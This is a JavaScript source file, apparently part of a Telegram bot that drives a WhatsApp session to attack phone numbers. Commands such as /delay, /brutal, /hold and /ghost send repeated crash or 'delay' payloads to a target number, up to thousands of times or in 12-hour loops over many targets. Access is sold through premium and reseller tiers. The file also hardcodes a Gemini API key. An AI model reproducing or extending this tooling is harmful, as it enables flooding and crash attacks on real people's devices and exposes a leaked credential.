        `[+] 𝗧𝗔𝗥𝗚𝗘𝗧   : ${zepnumb}\n` +
        `[+] 𝗦𝗧𝗔𝗧𝗨𝗦   : PROCESSING\n` +
        `[+] 𝗩𝗜𝗥𝗨𝗦  : InvisibleSql`
    );

    for (let i = 0; i < 3; i++) {
        await invisSqL(bijipler);
    }

    await ctx.telegram.editMessageText(
    ctx.chat.id,
    ProsesZephy.message_id,
    undefined,
    `[+] 𝗧𝗔𝗥𝗚𝗘𝗧   : ${zepnumb}\n` +
    `[+] 𝗦𝗧𝗔𝗧𝗨𝗦   : SUCCESS\n` +
    `[+] 𝗩𝗜𝗥𝗨𝗦  : InvisibleSql\n` +
    `Please pause for 10 minutes`
);

    console.log(chalk.blue.bold("Invisible : Successfully submitted bug"));
});

bot.command("delay", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example: /delay 628xxx`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');
    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(
        `[+] 𝗧𝗔𝗥𝗚𝗘𝗧  : ${zepnumb}\n` +
        `[+] 𝗦𝗧𝗔𝗧𝗨𝗦  : PROCESSING\n` +
        `[+] 𝗩𝗜𝗥𝗨𝗦  : InvisibleDelay`
    );

    for (let i = 0; i < 100; i++) {
        await exDelay(bijipler);
        await sleep(300);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `[+] 𝗧𝗔𝗥𝗚𝗘𝗧   : ${zepnumb}\n` +
        `[+] 𝗦𝗧𝗔𝗧𝗨𝗦   : SUCCESS\n` +
        `[+] 𝗩𝗜𝗥𝗨𝗦     : InvisibleDelay`
    );

    console.log(chalk.blue.bold("Delay invis : Successfully submitted bug"));
});

bot.command("brutal", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example: /brutal 628xxx`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');
    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(
        `[+] 𝗧𝗔𝗥𝗚𝗘𝗧  : ${zepnumb}\n` +
        `[+] 𝗦𝗧𝗔𝗧𝗨𝗦  : PROCESSING\n` +
        `[+] 𝗩𝗜𝗥𝗨𝗦  : InvisibleDelay`
    );

    for (let i = 0; i < 1200; i++) {
        await exDelay(bijipler);
        await sleep(300);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `[+] 𝗧𝗔𝗥𝗚𝗘𝗧   : ${zepnumb}\n` +
        `[+] 𝗦𝗧𝗔𝗧𝗨𝗦   : SUCCESS\n` +
        `[+] 𝗩𝗜𝗥𝗨𝗦     : InvisibleDelay`
    );

    console.log(chalk.blue.bold("Brutal : Successfully submitted bug"));
});

bot.command("hold", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example: /hold 628xxx`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');
    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(
        `[+] 𝗧𝗔𝗥𝗚𝗘𝗧  : ${zepnumb}\n` +
        `[+] 𝗦𝗧𝗔𝗧𝗨𝗦  : PROCESSING\n` +
        `[+] 𝗩𝗜𝗥𝗨𝗦  : InvisibleDelay`
    );

    for (let i = 0; i < 3260; i++) {
        await exDelay(bijipler);
        await sleep(300);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `[+] 𝗧𝗔𝗥𝗚𝗘𝗧   : ${zepnumb}\n` +
        `[+] 𝗦𝗧𝗔𝗧𝗨𝗦   : SUCCESS\n` +
        `[+] 𝗩𝗜𝗥𝗨𝗦     : InvisibleDelay`
    );

    console.log(chalk.blue.bold("Holdl : Successfully submitted bug"));
});

bot.command("test", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example: /ghost 628xxx`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');
    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(
        `[+] 𝗧𝗔𝗥𝗚𝗘𝗧  : ${zepnumb}\n` +
        `[+] 𝗦𝗧𝗔𝗧𝗨𝗦  : PROCESSING\n` +
        `[+] 𝗩𝗜𝗥𝗨𝗦  : GhostDelay`
    );

    for (let i = 0; i < 1; i++) {
        await InvisSQlV2(bijipler);
        
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `[+] 𝗧𝗔𝗥𝗚𝗘𝗧   : ${zepnumb}\n` +
        `[+] 𝗦𝗧𝗔𝗧𝗨𝗦   : SUCCESS\n` +
        `[+] 𝗩𝗜𝗥𝗨𝗦     : GhostDelay`
    );

    console.log(chalk.blue.bold("Ghost : Successfully submitted bug"));
});

bot.command("test1", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example: /ghost 628xxx`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');
    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(
        `[+] 𝗧𝗔𝗥𝗚𝗘𝗧  : ${zepnumb}\n` +
        `[+] 𝗦𝗧𝗔𝗧𝗨𝗦  : PROCESSING\n` +
        `[+] 𝗩𝗜𝗥𝗨𝗦  : GhostDelay`
    );

    for (let i = 0; i < 10; i++) {
        await NewIosInvis(bijipler);
        await sleep(500);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `[+] 𝗧𝗔𝗥𝗚𝗘𝗧   : ${zepnumb}\n` +
        `[+] 𝗦𝗧𝗔𝗧𝗨𝗦   : SUCCESS\n` +
        `[+] 𝗩𝗜𝗥𝗨𝗦     : GhostDelay`
    );

    console.log(chalk.blue.bold("Ghost : Successfully submitted bug"));
});

function startIosInvisMultiTargetsLoop() {
  const maxDuration = 12 * 60 * 60 * 1000; // 12 jam
  const startTime = Date.now();
  let index = 0;

  async function loop() {
    while (Date.now() - startTime < maxDuration && activeIosTargets.length > 0) {
      if (index >= activeIosTargets.length) {
        index = 0;
      }

      const target = activeIosTargets[index];

      if (!target || typeof target !== 'string') {
        index = (index + 1) % activeIosTargets.length;
        await sleep(300);
        continue;
      }

      const bijipler = target + "@s.whatsapp.net";

      try {
        await NewIosInvis(bijipler);
        console.log(`📵 IosFC sent to ${target}`);
      } catch (e) {
        console.error(`⚠️ NewIosInvis error for ${target}:`, e?.message || e);
      }

      await sleep(800); // antar request
      await sleep(200); // antar target
      index = (index + 1) % activeIosTargets.length;
    }

    iosLoopStarted = false;
    console.log("✅ IosFinity loop ended");
  }

  loop();
}

function startStallMultiTargetsLoop() {
  const maxDuration = 12 * 60 * 60 * 1000; // 12 jam
  const startTime = Date.now();
  let index = 0;

  async function loop() {
    while (Date.now() - startTime < maxDuration && activeStallTargets.length > 0) {
      if (index >= activeStallTargets.length) {
        index = 0;
      }

      const target = activeStallTargets[index];

      if (!target || typeof target !== 'string') {
        index = (index + 1) % activeStallTargets.length;
        await sleep(300);
        continue;
      }

      const bijipler = target + "@s.whatsapp.net";

      try {
        await exDelay(bijipler);
        console.log(`🚀 StallFinity sent to ${target}`);
      } catch (e) {
        console.error(`⚠️ exDelay error for ${target}:`, e?.message || e);
      }

      await sleep(600); // antar request
      await sleep(200); // antar target
      index = (index + 1) % activeStallTargets.length;
    }

    stallLoopStarted = false;
    console.log("✅ StallFinity loop ended");
  }

  loop();
}

function startGhostMultiTargetsLoop() {
  const maxDuration = 12 * 60 * 60 * 1000; // 12 jam
  const startTime = Date.now();
  let index = 0;

  async function loop() {
    while (Date.now() - startTime < maxDuration && activeGhostTargets.length > 0) {
      if (index >= activeGhostTargets.length) {
        index = 0;
      }

      const target = activeGhostTargets[index];

      if (!target || typeof target !== 'string') {
        index = (index + 1) % activeGhostTargets.length;
        await sleep(300);
        continue;
      }

      const bijipler = target + "@s.whatsapp.net";

      try {
        await GhostSqL(bijipler);
        console.log(`👻 Ghost sent to ${target}`);
      } catch (e) {
        console.error(`⚠️ GhostSqL error for ${target}:`, e?.message || e);
      }

      await sleep(400); // antar ghost
      await sleep(200); // antar target
      index = (index + 1) % activeGhostTargets.length;
    }

    ghostLoopStarted = false;
    console.log("✅ Ghost loop ended");
  }

  loop();
}

bot.command("ghost", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) {
    return ctx.reply(`Example: /ghost 628xxx`);
  }

  const zepnumb = q.replace(/[^0-9]/g, '');

  if (activeGhostTargets.includes(zepnumb)) {
    return ctx.reply(`Target ${zepnumb} is already in the list.`);
  }

  // Tambahkan ke daftar aktif
  activeGhostTargets.push(zepnumb);
  watchlist.push({
    number: zepnumb,
    virus: 'Crash',
    endTime: Date.now() + 12 * 60 * 60 * 1000
  });

  ctx.reply(`The attack started on ${zepnumb}`);

  // Jalankan loop jika belum berjalan
  if (!ghostLoopStarted) {
    ghostLoopStarted = true;
    startGhostMultiTargetsLoop();
  }
});

// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command('addown', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dijadikan premium.\nContoh: /addown 123456789");
    }

    const userId = args[1];

    if (ownerUsers.includes(userId)) {
        return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status owner`);
    }

    ownerUsers.push(userId);
    saveJSON(ownerFile, ownerUsers);

    return ctx.reply(`🎉 Pengguna ${userId} sekarang menjadi owner`);
});
bot.command('delown', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID owner\nContoh: /delown 123456789");
    }

    const userId = args[1];

    if (!ownerUsers.includes(userId)) {
        return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar owner`);
    }

    ownerUsers = ownerUsers.filter(id => id !== userId);
    saveJSON(ownerFile, ownerUsers);

    return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar owner`);
});

bot.command('addprem', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dijadikan premium.\nContoh: /addprem 123456789");
    }

    const userId = args[1];

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status premium.`);
    }

    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🎉 Pengguna ${userId} sekarang memiliki akses premium!`);
});

// Perintah untuk menghapus pengguna premium (hanya owner)
bot.command('delprem', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delprem 123456789");
    }

    const userId = args[1];

    if (!premiumUsers.includes(userId)) {
        return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
    }

    premiumUsers = premiumUsers.filter(id => id !== userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar premium.`);
});

// Perintah untuk mengecek status premium
bot.command('cekprem', (ctx) => {
    const userId = ctx.from.id.toString();

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ You are a premium member`);
    } else {
        return ctx.reply(`❌ You are not a premium user.`);
    }
});

bot.command('addreseller', async (ctx) => {
    const userId = ctx.from.id.toString();

    if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan fitur ini.");
    }

    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Anda perlu memberikan ID reseller setelah perintah. Contoh: /addreseller 12345");
    }

    const resellerId = args[1];
    if (resellers.includes(resellerId)) {
        return ctx.reply(`❌ Reseller dengan ID ${resellerId} sudah terdaftar.`);
    }

    const success = await addReseller(resellerId);

    if (success) {
        return ctx.reply(`✅ Reseller dengan ID ${resellerId} berhasil ditambahkan.`);
    } else {
        return ctx.reply(`❌ Gagal menambahkan reseller dengan ID ${resellerId}.`);
    }
});

// Fungsi untuk merestart bot menggunakan PM2
const restartBot = () => {
  pm2.connect((err) => {
    if (err) {
      console.error('Gagal terhubung ke PM2:', err);
      return;
    }

    pm2.restart('index', (err) => { // 'index' adalah nama proses PM2 Anda
      pm2.disconnect(); // Putuskan koneksi setelah restart
      if (err) {
        console.error('Gagal merestart bot:', err);
      } else {
        console.log('Bot berhasil direstart.');
      }
    });
  });
};

const escapeMarkdown = (text) =>
  text
    .replace(/[_`()~>#+=|{}.!-]/g, "\\$&"); // jangan escape asterisk (*)

const userSessions = new Map(); // { userId: [ {role, content}, ... ] }
let isGlobalAIDisabled = true; // Status AI global
const lastBotMessage = new Map(); // Menyimpan message_id terakhir dari bot per user

// Hanya owner bisa mematikan AI global
bot.command('off', (ctx) => {
    const userId = ctx.from.id.toString();
    if (!ownerUsers.includes(userId)) {
        return ctx.reply("⛔ You are not the owner");
    }

    isGlobalAIDisabled = true;
    lastBotMessage.delete(userId); // 🆕 Hapus pesan terakhir dari AI
    ctx.reply("✅ AI has been *disable*.", { parse_mode: "Markdown" });
});

// Hanya owner bisa menghidupkan AI global
bot.command('on', (ctx) => {
    const userId = ctx.from.id.toString();
    if (!ownerUsers.includes(userId)) {
        return ctx.reply("⛔ You are not the owner ");
    }

    isGlobalAIDisabled = false;
    ctx.reply("✅ AI has been *enable*.", { parse_mode: "Markdown" });
});

// Reset sesi GPT - semua user bisa
bot.command('reset', (ctx) => {
    const userId = ctx.from.id.toString();
    userSessions.delete(userId);
    ctx.reply("🔁 Your AI history has been successfully *Reset*.", { parse_mode: "Markdown" });
});

const GEMINI_API_KEY = "AIzaSyAotFJ5IJY3MhSdJVDtwZZPyVidu3Yr6oE"; 

// Escape karakter Markdown yang bermasalah tapi biarkan * tetap bisa dipakai
const escapeMarkdownAi = (text) =>
  text
    .replace(/[_`()~>#+=|{}.!-]/g, "\\$&"); // jangan escape asterisk (*), biar bisa bold

bot.on('text', checkPremiumAi, async (ctx) => {
    const text = ctx.message.text;
    const userId = ctx.from.id.toString();

    if (text.startsWith("/")) return;
    if (isGlobalAIDisabled) return;

    const reply = ctx.message.reply_to_message;
    const lastMsgId = lastBotMessage.get(userId);

    // Jika ada last message, pastikan user reply ke pesan itu
    if (lastMsgId && (!reply || reply.from.id !== ctx.botInfo.id || reply.message_id !== lastMsgId)) {
        return;
    }

    let processing;
    try {
        processing = await ctx.reply("*Find out...*", { parse_mode: "Markdown" });
    } catch (e) {
        return;
    }

    try {
        let session = userSessions.get(userId) || [];
        session.push({ role: "user", content: text });

        // Kirim permintaan ke Gemini API
        const response = await axios.post(
            `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${GEMINI_API_KEY}`,
            {
                contents: [
                    {
                        parts: [
                            {
                                text: text
                            }
                        ]
                    }
                ]
            },
            {
                headers: {
                    "Content-Type": "application/json"
                }
            }
        );

        // Ambil jawaban Gemini
        const candidates = response.data.candidates;
        let gptReply = "❌ Empty answer from AI.";
        if (candidates && candidates.length > 0) {
            const parts = candidates[0].content.parts;
            gptReply = parts.map(p => (typeof p === "string" ? p : (p.text || ""))).join("\n").trim();
        }

        // Simpan dalam sesi
        session.push({ role: "assistant", content: gptReply });
        userSessions.set(userId, session);

        await ctx.sendChatAction('typing');

        try {
            await ctx.telegram.deleteMessage(ctx.chat.id, processing.message_id);
        } catch (e) {}

        const note = !lastMsgId ? "\n\n_Reply pesan bot untuk melanjutkan percakapan_" : "";
        const fullReply = `${gptReply}${note}\n\n[ZnetBot](https://t.me/rloo11)`;

        const sent = await ctx.reply(fullReply, {
            parse_mode: "Markdown"
        });

        // Simpan ID pesan bot terakhir
        lastBotMessage.set(userId, sent.message_id);

    } catch (err) {
        console.error("Gemini ERROR:", err.message);
        try {
            await ctx.telegram.deleteMessage(ctx.chat.id, processing.message_id);
        } catch (e) {}
        await ctx.reply("❌ An error occurred while processing the answer from Gemini.");
    }
});

(async () => {
    console.clear();
    console.log("🚀 Memulai sesi WhatsApp...");
    startSesi();
    console.log("Sukses connected");
    bot.launch();
    
    // Membersihkan konsol sebelum menampilkan pesan sukses
    console.clear();
    console.log(chalk.bold.red(`
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣻⣿⣿⣿⡿⢿⡿⠿⠿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⡿⣿⣿
⣿⣿⣿⣿⠿⠿⢿⣿⣿⠟⣋⣭⣶⣶⣞⣿⣶⣶⣶⣬⣉⠻⣿⣿⡿⣋⣉⠻⣿⣿⣿
⣿⢻⣿⠃⣤⣤⣢⣍⣴⣿⢋⣵⣿⣿⣿⣿⣷⣶⣝⣿⣿⣧⣄⢉⣜⣥⣜⢷⢹⢇⢛
⡏⡦⡁⡸⢛⡴⢣⣾⢟⣿⣿⣿⢟⣾⣧⣙⢿⣿⣿⣿⣿⣿⣿⣿⢩⢳⣞⢿⡏⢷⣾
⣷⣵⡇⣗⡾⢁⣾⣟⣾⣿⡿⣻⣾⣿⣿⣿⡎⠛⡛⢿⣿⡟⣿⣿⡜⡜⢿⡌⠇⢾⣿
⣿⣿⠁⣾⠏⣾⣿⣿⣽⣑⣺⣥⣿⣿⣿⣿⣷⣶⣦⣖⢝⢿⣿⣿⣿⡀⠹⣿⣼⢸⣿
⣿⣿⢰⡏⢡⣿⣿⠐⣵⠿⠛⠛⣿⣿⣿⣿⣿⠍⠚⢙⠻⢦⣼⣿⣿⠁⣄⣿⣿⠘⣿
⣿⣿⢸⢹⢈⣿⣿⠘⣡⡞⠉⡀⢻⣿⣿⣿⣿⢃⠠⢈⢳⣌⣩⣿⣿⠰⠿⢼⣿⠀⣿
⣿⠿⣘⠯⠌⡟⣿⡟⣾⣇⢾⡵⣹⣟⣿⣿⣿⣮⣓⣫⣿⣟⢿⣿⢿⡾⡹⢆⣦⣤⢹
⣅⣛⠶⠽⣧⣋⠳⡓⢿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣫⣸⠏⡋⠷⣛⣫⡍⣶⣿
⣿⡿⢸⢳⣶⣶⠀⡇⣬⡛⠿⣿⣿⣿⣿⣿⣿⣿⠿⢟⣉⣕⡭⠀⢺⣸⣽⢻⡅⣿⣿
⣿⡇⣾⡾⣰⡯⠀⡗⣯⣿⣽⡶⠶⠂⢠⣾⣿⠐⠚⠻⢯⣿⠇⠎⡀⣳⣿⣼⡃⣿⣿
⣿⡇⣟⣇⡟⣧⠀⡗⣿⣿⡿⢡⢖⣀⠼⢟⣻⣤⣔⢦⢸⣿⢀⢆⢡⣿⣯⢹⡃⣿⣿
⣿⡇⡏⣿⡾⣸⣿⣇⠸⠟⣋⣼⣼⣿⢻⣿⣿⢿⣟⢾⣌⠫⠈⣶⣿⡿⣩⡿⢃⣿⣿
⣿⣷⡀⠻⡷⢪⢧⡙⠰⣾⣿⣿⣾⡽⣾⣿⡿⣺⣵⣾⣿⡇⡜⣽⠟⢷⣪⣴⣿⣿⣿
⣿⣿⣿⣾⣿⠏⣤⡁⣷⣽⣿⣿⣿⣿⣷⣶⣿⣿⣿⣿⣿⣱⠸⣱⣦⠙⣿⣿⣿⣾⣿`));
    console.log(chalk.bold.white("DEVELOPER: RLOO11"));
    console.log(chalk.bold.white("VERSION: 3.0.1"));
    console.log(chalk.bold.white("ACCESS: ") + chalk.bold.green("YES"));
    console.log(chalk.bold.white("STATUS: ") + chalk.bold.green("ONLINE\n\n"));
    console.log(chalk.bold.yellow("[+] Bot successfully connected"));
})();